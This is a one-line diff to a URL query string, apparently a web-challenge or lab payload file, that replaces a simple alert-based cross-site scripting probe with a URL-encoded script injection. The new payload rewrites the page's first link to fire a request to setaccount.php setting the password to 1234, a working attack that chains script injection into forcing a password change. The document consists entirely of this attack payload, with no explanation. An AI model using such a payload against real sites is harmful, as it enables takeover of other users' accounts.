@@ -1,1 +1,1 @@
-?q="%3Balert('hi')%3B"
+?q=%3Cscript%3EsetTimeout(%22document.getElementsByTagName(%27a%27)[0].href%2B=\%27%3Cscript%3Edocument.getElementsByTagName(\%22a\%22)[0].href=\%22setaccount.php%253Fpass1=1234%2526pass2=1234\%22%3C\/script%3E\%27%22,1000)%3C/script%3E
